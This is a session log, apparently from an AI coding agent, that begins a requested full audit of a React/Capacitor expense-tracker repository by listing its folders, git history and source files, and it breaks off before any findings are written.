# Complete production-grade project review

**Session ID:** ses_043e7adb7ffeGAlzbd4wAn3Wxl
**Created:** 01/08/2026, 12:22:18
**Updated:** 01/08/2026, 12:23:15

---

## User

Act as a Principal Software Architect, Principal Full Stack Engineer, Principal QA Engineer, Security Engineer, Performance Engineer, and DevOps Reviewer.

Perform a COMPLETE production-grade review of this entire project.

DO NOT give generic suggestions.
DO NOT skip any folders.
DO NOT assume code is correct.
Verify everything from the actual source code.

Review the complete project including (but not limited to):

• Frontend
• Backend
• API
• Database
• Authentication
• Authorization
• Business Logic
• Architecture
• State Management
• Components
• Services
• Routing
• Models
• DTOs
• Utilities
• Configuration
• Build Scripts
• Environment Variables
• Docker
• CI/CD
• Unit Tests
• Integration Tests
• E2E Tests
• Mobile Support
• Responsive UI
• Accessibility
• Performance
• Memory Usage
• Logging
• Exception Handling
• Security
• Dependency Management

Search the ENTIRE repository.

Check every source file.

Review every folder.

Review every module.

Review every feature.

Identify ALL bugs and classify them.

Bug Severity:

P0 - Critical
Production crash
Data loss
Security vulnerability
Authentication failure
Payment failure
Broken business logic
Memory leak
Application cannot start

P1 - High
Major feature broken
API issue
Incorrect calculations
State corruption
Concurrency issue
WebSocket issue
Performance bottleneck

P2 - Medium
Validation issues
UI bugs
Layout issues
Slow rendering
Duplicate code
Poor architecture
Missing error handling

P3 - Low
Code style
Naming
Documentation
Minor UI issues
Refactoring opportunities

For EVERY bug provide:

-------------------------------------------------
ID
Title
Severity
Category
Description
Root Cause
Affected Files
Affected Functions
How to Reproduce
Expected Result
Actual Result
Risk
Suggested Fix
Estimated Fix Time
-------------------------------------------------

Also identify:

Security Vulnerabilities
------------------------
• XSS
• CSRF
• SQL Injection
• Command Injection
• SSRF
• Authentication issues
• Authorization issues
• Secrets inside repository
• Hardcoded passwords
• Token leakage
• API exposure
• Dependency vulnerabilities
• OWASP Top 10 issues

Performance Review
------------------
Check for:

• Memory leaks
• Infinite rendering
• Infinite loops
• Unnecessary rebuilds
• Duplicate API calls
• N+1 queries
• Slow database queries
• Missing indexes
• Bundle size
• Lazy loading
• Tree shaking
• Image optimization
• Cache issues
• WebSocket efficiency
• Thread blocking
• CPU intensive code

Architecture Review
-------------------

Check:

• SOLID violations
• Circular dependencies
• Tight coupling
• Dead code
• Duplicate logic
• Code smells
• Large classes
• Large methods
• Improper abstraction
• Missing interfaces
• Dependency Injection issues

Frontend Review
---------------

Review:

• Components
• Routing
• Forms
• Validation
• State Management
• API Integration
• Error Handling
• Responsive Design
• Accessibility
• Dark Mode
• Theme
• Browser compatibility

Backend Review
--------------

Review:

• REST APIs
• Controllers
• Services
• Repository
• Transactions
• Database queries
• Caching
• Exception handling
• Validation
• DTO mapping
• Logging
• Scheduling
• Background jobs
• WebSockets
• Microservices

Testing Review
--------------

Check:

• Unit Tests
• Integration Tests
• E2E Tests
• Mock quality
• Coverage gaps
• Missing scenarios

Dependency Review
-----------------

Review:

• Outdated packages
• Vulnerable libraries
• Duplicate packages
• Unused dependencies
• Build configuration

Output MUST be in Markdown.

Generate exactly these files.

1.
BUG_REPORT.md

Contains every bug grouped by severity.

2.
SECURITY_REPORT.md

Complete security audit.

3.
PERFORMANCE_REPORT.md

Complete performance audit.

4.
ARCHITECTURE_REVIEW.md

Architecture findings and recommendations.

5.
CODE_QUALITY_REPORT.md

Maintainability review.

6.
TEST_COVERAGE_REPORT.md

Testing gaps.

7.
DEPENDENCY_AUDIT.md

Dependency analysis.

8.
PRODUCTION_READINESS_REPORT.md

Production readiness score from 0–100.

9.
FIX_ROADMAP.md

Prioritized implementation plan.

10.
EXECUTIVE_SUMMARY.md

Management summary with:

• Total Files Reviewed
• Total Lines of Code
• Total Bugs
• P0 Count
• P1 Count
• P2 Count
• P3 Count
• Security Issues
• Performance Issues
• Architecture Issues
• Overall Code Quality Score
• Maintainability Score
• Security Score
• Performance Score
• Test Coverage Score
• Production Readiness Score

Finally generate a FINAL SUMMARY table like this:

| Category | Count |
|----------|------:|
| Files Reviewed | |
| LOC | |
| P0 Bugs | |
| P1 Bugs | |
| P2 Bugs | |
| P3 Bugs | |
| Security Issues | |
| Performance Issues | |
| Architecture Issues | |
| Code Smells | |
| Duplicate Code | |
| Dead Code | |
| Test Coverage % | |
| Production Readiness % | |

Rules:

- Never stop after finding a few issues.
- Continue until every file has been reviewed.
- Do not generate fake issues.
- Every finding must reference actual file names and line numbers whenever possible.
- Verify findings before reporting them.
- Prioritize accuracy over quantity.
- Do not modify project files unless explicitly requested.
- Produce professional, production-grade audit reports suitable for enterprise software review. 

---

## Assistant (Build · DeepSeek V4 Flash Free (New) · 6.7s)

_Thinking:_

This is a large task. The user wants a comprehensive production-grade review of the entire project. Let me start by exploring the repository structure to understand what we're working with.

Let me begin by understanding the project layout, then read files systematically.

Let me start by exploring the project structure.

I'll perform a comprehensive review. Let me start by understanding the project structure.

**Tool: bash**

**Input:**
```json
{
  "command": "Get-ChildItem -Force | Select-Object Mode, Length, Name | Format-Table -AutoSize"
}
```

**Output:**
```

Mode   Length Name                      
----   ------ ----                      
d-----        .claude                   
d--h--        .git                      
d-----        node_modules              
d-----        path                      
d-----        rc2                       
d-----        shyblack                  
-a---- 995    AGENTS.md                 
-a---- 15015  hs_err_pid13080.log       
-a---- 105    package-lock.json         
-a---- 15284  PRODUCTION_AUDIT_REPORT.md
-a---- 1439   README.md                 
-a---- 2668   shyblack-release-key.jks  



```

**Tool: bash**

**Input:**
```json
{
  "command": "git log --oneline -20; git status"
}
```

**Output:**
```
fedd441 add update for google dploye issue
e147a6b add udpate for version issue
46631f7 add udpate for goole play store updalod issues fixed
1092f36 feat: complete branding update with new Expense Tracker ShyBlack logo
8cfb167 chore: update ShyBlack Finora branding and project documentation
566c38f feat(transactions): add complete edit transaction functionality
559abba add update for final version
1efe5ad Fix backup export pipeline and Android release improvements
671284a release: FINORA v1.0 Release Candidate
7b74f4c feat: add Bills, SkeletonLoader, SuccessAnimation, accessibility hooks, performance utils, responsive helpers, and production audit report
d4f2bb6 feat: complete FINORA rebranding and branding overhaul
1b93f83 feat: branded notification system with Android 13+ permissions, deep linking, unified channel, and i18n refactoring across pages
5473905 fix: Bugs 2-3 - Notifications and keyboard focus
b03f629 fix: Bug 1 - Fingerprint auth triggers on cold start and resume
a55c9cf fix: Bug #3 - Modal focus stealing (useRef onClose, effect deps [open] only)
7b8a012 fix: Bug #2 - Add SCHEDULE_EXACT_ALARM for Android 12+ exact alarm notifications
cd097b8 fix: Bug #1 - Cold start lock screen bypass (sessionStarted guard)
3514744 PRE_PRODUCTION_BUGFIX_BASELINE
7ecb39e Production stabilization complete - 500 tests passing
a7a5860 PRE_AUDIT_BASELINE
On branch main
Your branch is up to date with 'origin/main'.

nothing to commit, working tree clean

```

---

## Assistant (Build · DeepSeek V4 Flash Free (New) · 4.1s)

_Thinking:_

This is a React Native / Expo project (based on "React Native" hints, Android release, .jks keystore). Let me explore the project structure more deeply. There are multiple folders: .claude, path, rc2, shyblack, plus node_modules.

Let me look at the directory structure in detail.

**Tool: bash**

**Input:**
```json
{
  "command": "Get-ChildItem -Force -Directory | ForEach-Object { $_.Name }; Write-Output \"---shyblack---\"; Get-ChildItem -Force shyblack | Select-Object Mode, Name"
}
```

**Output:**
```
.claude
.git
node_modules
path
rc2
shyblack
---shyblack---

Mode   Name                    
----   ----                    
d----- android                 
d----- dist                    
d----- node_modules            
d----- playstore               
d----- public                  
d----- resources               
d----- scripts                 
d----- src                     
-a---- .eslintrc.cjs           
-a---- .gitignore              
-a---- 1                       
-a---- capacitor-assets.json   
-a---- capacitor.config.json   
-a---- index.html              
-a---- MULTI_WALLET_ANALYSIS.md
-a---- package-lock.json       
-a---- package.json            
-a---- postcss.config.js       
-a---- README.md               
-a---- tailwind.config.js      
-a---- vite.config.js          



```

**Tool: bash**

**Input:**
```json
{
  "command": "Get-ChildItem -Force path | Select-Object Mode, Name; Write-Output \"---rc2---\"; Get-ChildItem -Force rc2 | Select-Object Mode, Name; Write-Output \"---claude---\"; Get-ChildItem -Force .claude | Select-Object Mode, Name"
}
```

**Output:**
```

Mode   Name                       
----   ----                       
d----- to                         
---rc2---
-a---- FINAL_RELEASE_REPORT.md    
-a---- KNOWN_ISSUES_REGISTER.md   
-a---- PLAY_STORE_ASSETS.md       
-a---- REAL_DEVICE_TEST_MATRIX.md 
-a---- RELEASE_BUILD_VALIDATION.md
-a---- STRESS_TEST_RESULTS.md     
-a---- UX_CLEANUP.md              
---claude---
-a---- settings.local.json        



```

---

## Assistant (Build · DeepSeek V4 Flash Free (New) · 3.2s)

_Thinking:_

This is a Vite + React app (with Capacitor for Android). Let me explore the src folder structure.

**Tool: bash**

**Input:**
```json
{
  "command": "Get-ChildItem -Recurse shyblack/src -File | Select-Object FullName, Length | Format-Table -AutoSize"
}
```

**Output:**
```

FullName                                                                                                         Length
--------                                                                                                         ------
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\App.jsx                               13138
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\index.css                              9374
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\main.jsx                                245
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\assets\logo.png                     1496089
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\AddDebtModal.jsx            7270
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\AndroidBackHandler.jsx      1987
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\AnimatedNumber.jsx          1106
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\BottomNav.jsx               3293
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\BrandHeader.jsx             1713
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\CategoryIcon.jsx             528
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\ConfirmationModal.jsx       5257
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\DashboardEmiWidget.jsx      5622
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\DebtCard.jsx                4266
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\EmptyState.jsx              3704
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\ErrorBoundary.jsx           4471
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\FinancialScore.jsx          5114
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\GlassCard.jsx               1540
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\Modal.jsx                   2975
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\NotificationBanner.jsx      1375
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\PageErrorBoundary.jsx       2315
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\PageHeader.jsx               409
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\PinLockScreen.jsx           9748
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\QuickActionCenter.jsx       3078
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\QuickActions.jsx            1701
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\RelatedItemsPanel.jsx       7035
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\SavingsProgress.jsx         2438
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\ScrollRestoration.jsx        693
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\SkeletonLoader.jsx          1939
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\StatCard.jsx                 906
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\SuccessAnimation.jsx        2157
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\Toast.jsx                   4721
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\components\TransactionItem.jsx         4478
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\context\FinanceContext.jsx            58929
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\hooks\useAccessibility.js              2446
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\hooks\useFinance.js                     294
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\i18n\en.json                          69609
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\i18n\hi.json                          63720
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\i18n\index.jsx                         2682
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\i18n\kn.json                          68979
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\i18n\ta.json                          99237
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\i18n\te.json                          71352
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\AccountCenterPage.jsx           12200
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\AchievementsPage.jsx             8347
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\AddTransaction.jsx              26613
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\Analytics.jsx                   16909
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\AppInfoPage.jsx                  4140
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\BillsPage.jsx                   18108
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\BudgetCenterPage.jsx            18795
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\BudgetsPage.jsx                 22779
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\CashFlowForecastPage.jsx        13164
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\CategoryDetail.jsx              17315
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\Dashboard.jsx                   30791
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\DataQualityPage.jsx              5426
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\DebtsPage.jsx                   27565
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\DiagnosticsPage.jsx             16494
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\DocumentVaultPage.jsx           37207
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\EmiCenterPage.jsx               30806
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\FinancialCalendarPage.jsx       49033
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\FinancialHealthPage.jsx         25731
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\FinancialTimelinePage.jsx       10528
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\ForecastCenterPage.jsx          27295
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\GoalsPage.jsx                   20260
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\HealthCenterPage.jsx            10557
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\History.jsx                     20172
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\InsightsPage.jsx                16140
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\MonthlyReview.jsx                5815
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\NetWorthPage.jsx                14526
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\Onboarding.jsx                  24894
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\PersonCenterPage.jsx            10010
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\PrivacyCenter.jsx                4115
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\ReceiptCenterPage.jsx           16664
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\RecoveryCenterPage.jsx          19531
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\RecurringTransactionsPage.jsx   30833
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\ReportsPage.jsx                 34770
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\ReviewCenterPage.jsx            28790
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\SearchPage.jsx                  26183
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\Settings.jsx                    59766
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\SIPCalculatorPage.jsx           15635
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\StatementCenterPage.jsx         14999
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\StatementExportPage.jsx          9306
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\SubscriptionsPage.jsx           11602
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\TimelinePage.jsx                 8506
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\TransferPage.jsx                 9298
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\TrendsPage.jsx                  13514
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\pages\WealthCenterPage.jsx            35793
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\achievements.js                  7475
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\analytics.js                     4575
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\archiveEngine.js                 3370
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\backup.js                       32284
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\backupHealth.js                  3334
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\backupManager.js                 6319
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\backupMetadata.js                3918
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\bills.js                         5785
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\biometrics.js                    2707
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\budgetNotifications.js           2428
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\budgets.js                       3098
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\budgetUtils.js                   6332
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\cashFlowForecast.js              7086
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\categoryDrilldown.js             4710
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\constants.js                     2637
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\contacts.js                      4178
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\currency.js                      1368
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\dailyTip.js                     34787
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\dataIntegrity.js                 9584
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\dataQuality.js                   5031
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\dataValidator.js                 4664
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\debts.js                        12128
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\documents.js                     7613
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\downloadUtils.js                12579
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\emi.js                          19019
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\emiNotifications.js              2840
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\exports.js                      25186
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\financialCalendar.js            10371
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\financialHealth.js              14793
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\financialTimeline.js             7083
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\forecastEngine.js               28422
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\fullSearchIndex.js               3731
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\goals.js                         2092
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\haptics.js                        821
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\healthScore2.js                 27536
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\helpers.js                       2523
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\indexer.js                       5194
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\insights.js                     28054
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\insightsEngine.js               16849
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\integrityValidator.js            7082
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\lazyImport.js                     516
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\networth.js                      6468
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\notifications.js                10149
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\pdfExport.js                    11201
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\pdfReport.js                    48119
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\performance.js                   2700
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\performanceAudit.js              4076
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\privacy.js                       5421
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\receiptParser.js                 8390
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\receiptUtils.js                  2360
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\recurring.js                    11008
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\relationshipInsights.js          2878
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\relationships.js                 4529
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\reminders.js                     8642
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\responsive.js                    1111
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\review.js                        4327
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\reviewCenter.js                  5101
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\reviewEngine.js                 10566
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\safeStorage.js                   3652
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\schema.js                        5360
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\security.js                       836
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\sipCalculator.js                 2113
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\snapshotRecovery.js              3753
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\statementGenerator.js           20077
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\storageAdapter.js                9303
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\storageHealth.js                 7208
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\tags.js                          3424
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\templates.js                     1722
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\timeline.js                     10819
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\transfers.js                     3074
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\trends.js                        2481
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\wealthUtils.js                   8778
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\backup.test.js               4787
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\backupV2.test.js            11958
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\crashResilience.test.js      1256
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\dataQuality.test.js          5169
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\debts.test.js               17553
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\diagnostic_bugs.test.js     43607
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\documents.test.js           14490
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\emi.test.js                 14546
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\forecast.test.js            16126
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\goals.test.js                3190
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\indexer.test.js              6151
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\insights.test.js             4824
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\largeDataset.test.js         3266
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\pdfReport.test.js            4937
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\performance.test.js          2383
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\production.test.js          21969
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\receipt.test.js              5234
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\recurring.test.js           13382
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\reviewCenter.test.js         3748
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\safeStorage.test.js          2409
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\schema.test.js               3696
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\setup.cjs                    1460
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\snapshotRecovery.test.js     4190
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\trends.test.js               2705
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\__tests__\wealth.test.js              10373



```

---

## Assistant (Build · DeepSeek V4 Flash Free (New) · 5.7s)

_Thinking:_

This is a large project. It's a financial tracking app (Expense Tracker "ShyBlack") built with React + Vite + Capacitor. No backend appears in the src — it's likely a client-only app with localStorage. Let me confirm by looking at package.json, then examine the key files.

Let me look at the structure:
- Frontend only (Vite + React)
- Capacitor for Android
- No backend server visible in src
- Uses localStorage for data storage

Let me read the package.json, configs, and start reviewing the core files. Given the size, I'll delegate some exploration to agents. But I need to be thorough. Let me read the most critical files first: package.json, App.jsx, FinanceContext.jsx (the big one - 59KB), main.jsx, vite.config, capacitor config.

Let me use parallel task agents to explore different areas, but since the review is a major undertaking and I need accuracy with actual file names/line numbers, I should read the files myself. Let me start with key configuration files.

